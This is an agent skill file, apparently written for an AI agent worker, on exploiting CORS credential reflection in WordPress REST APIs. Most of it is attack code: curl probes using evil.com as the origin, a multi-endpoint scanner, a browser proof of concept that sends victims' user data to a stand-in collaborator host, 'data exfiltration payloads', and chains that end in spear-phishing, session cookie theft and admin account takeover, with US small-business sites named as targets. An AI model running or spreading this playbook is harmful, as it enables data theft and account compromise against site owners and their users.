---
name: cors-credential-wordpress
description: Exploit WP CORS credential reflection for data theft.
version: 1.0.0
author: agentiko
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
metadata:
  hermes:
    tags: [recon, cors, wordpress, credential-theft, ATO]
    category: recon
    related_skills:
      - wp-mass-recon
      - xmlrpc-exploitation
      - cross-attack-chains
      - wordpress-full-compromise
---

# CORS Credential WordPress Skill

Detect, confirm, and exploit CORS credential reflection on WordPress REST API endpoints. CORS misconfiguration is one of the most common critical findings in US SMB WordPress sites (~7-8% of all WP targets), enabling cross-origin data exfiltration with victim cookies. Documents 8 CORS variants and full browser PoC construction.

## When to Use

- After `wp-mass-recon` flags a target with `Access-Control-Allow-Credentials: true`.
- Testing any WordPress site's REST API for cross-origin data access.
- Building attack chains: CORS → user enumeration → spear-phishing → ATO.
- Validating whether a CORS finding is exploitable (not just present).

## Prerequisites

- `terminal` tool with curl and python3.
- `web_extract` or `browser_navigate` for browser PoC verification.
- Target must have WordPress REST API accessible (`/wp-json/wp/v2/`).

## How to Run

```bash
# Quick detection
curl -skI "https://TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -iE "access-control"

# Full CORS matrix (10 endpoints)
for ep in "users" "posts" "pages" "media" "comments" "categories" "tags" "settings" "plugins" "themes"; do
  echo "=== /wp-json/wp/v2/$ep ==="
  curl -skI "https://TARGET/wp-json/wp/v2/$ep" -H "Origin: https://evil.com" | grep -iE "access-control|http/"
  echo ""
done
```

## Quick Reference

| Variant | Detection | Exploitability |
|---------|-----------|----------------|
| Origin reflection + creds | `Access-Control-Allow-Credentials: true` + mirror Origin | Critical — full data theft |
| Null origin | `Access-Control-Allow-Origin: null` | High — sandboxed iframes |
| Wildcard no creds | `Access-Control-Allow-Origin: *` (no creds) | Info — public data only |
| Credentialed preflight | OPTIONS returns 200 + ACAC | High — if GET without preflight |
| Auth-only leak | CORS only on auth-protected endpoints | High — cookie theft |
| Multi-origin | Multiple origins reflected | Critical — broader attack surface |
| Plugin-specific CORS | CORS only on plugin namespace | Medium — plugin data |
| Staging-only CORS | Production has no CORS, staging does | Medium — dependent on staging access |

## Procedure

### Step 1 — Single-Endpoint Detection

```bash
curl -skI "https://TARGET/wp-json/wp/v2/users" \
  -H "Origin: https://evil.com" \
  -H "User-Agent: Mozilla/5.0" 2>&1
```

Positive signals:
- `Access-Control-Allow-Origin: https://evil.com` (mirrors attacker origin)
- `Access-Control-Allow-Credentials: true` (sends cookies cross-origin)
- `Access-Control-Allow-Methods: GET` (data exfiltration vector)
- HTTP 200 on the endpoint itself (data is accessible)

### Step 2 — Multi-Endpoint CORS Matrix

```bash
#!/bin/bash
TARGET="$1"
ENDPOINTS=(
  "wp/v2/users"
  "wp/v2/posts"
  "wp/v2/pages"
  "wp/v2/media"
  "wp/v2/comments"
  "wp/v2/categories"
  "wp/v2/tags"
  "wc/v3/products"
  "wc/v3/orders"
  "gf/v2/forms"
  "elementor/v1/globals"
  "revslider/v1/slides"
)

for ep in "${ENDPOINTS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "https://$TARGET/wp-json/$ep")
  if [[ "$code" == "200" ]]; then
    cors=$(curl -skI --max-time 10 "https://$TARGET/wp-json/$ep" -H "Origin: https://evil.com" 2>/dev/null | grep -i "access-control-allow-credentials: true")
    if [[ -n "$cors" ]]; then
      echo "[CRITICAL] CORS ON: /wp-json/$ep — data accessible cross-origin"
    fi
  fi
done
```

### Step 3 — Browser PoC (save as poc.html)

```html
<script>
fetch("https://TARGET/wp-json/wp/v2/users", {
  credentials: "include",
  headers: { "Origin": "https://evil.com" }
})
.then(r => r.json())
.then(data => {
  fetch("https://YOUR_COLLABORATOR/log?d=" + btoa(JSON.stringify(data)));
});
</script>
```

### Step 4 — Data Exfiltration Payloads

```bash
# Exfiltrate users with emails
curl -sk "https://TARGET/wp-json/wp/v2/users?context=edit" \
  -H "Origin: https://evil.com" | python3 -m json.tool | grep -E '"id"|"name"|"slug"|"email"|"roles"'

# Exfiltrate all posts
curl -sk "https://TARGET/wp-json/wp/v2/posts?per_page=100" \
  -H "Origin: https://evil.com" | python3 -c "
import sys, json
posts = json.load(sys.stdin)
for p in posts:
    print(f\"{p['id']}: {p['title']['rendered']}\")
" 2>/dev/null

# Exfiltrate WooCommerce products
curl -sk "https://TARGET/wp-json/wc/v3/products" \
  -H "Origin: https://evil.com" | python3 -m json.tool 2>/dev/null | head -50
```

## Attack Chains

### Chain A: CORS → User Enum → Spear-Phish → ATO
1. CORS exfiltrates all users with names/slugs
2. Craft spear-phishing email to admin (`admin@target.com`)
3. Link to CORS phishing page that steals WP session cookie
4. Login as admin with stolen session → full site compromise

### Chain B: CORS → Cookie Theft → API Access → ATO
1. Victim visits attacker page while logged into target WP
2. CORS fetch with `credentials: "include"` sends WP auth cookie
3. Attacker replays cookie to access `/wp-admin/` as victim
4. Change admin email, reset password → persistent access

## Pitfalls

- **Preflight blocking:** Some servers require OPTIONS preflight for CORS requests with custom headers. Test with both simple GET (no preflight) and credentialed fetch (triggers preflight).
- **SameSite cookies:** `SameSite=Lax` or `SameSite=Strict` cookies won't send cross-origin even with CORS. Check cookie attributes in browser.
- **WAF interference:** Cloudflare may strip `Origin` header or block cross-origin requests. Test from non-Cloudflare IP.
- **False positive: `Access-Control-Allow-Origin: *` without credentials** — this is public data, not a vulnerability. The key is `Access-Control-Allow-Credentials: true`.

## Verification

- The curl command MUST show `Access-Control-Allow-Credentials: true` AND an `Access-Control-Allow-Origin` that matches the attacker's origin (not `*`).
- Browser PoC MUST successfully fetch data from a different origin with credentials.
- The exfiltrated data MUST contain non-public information (users, posts, settings — not just public WP metadata).
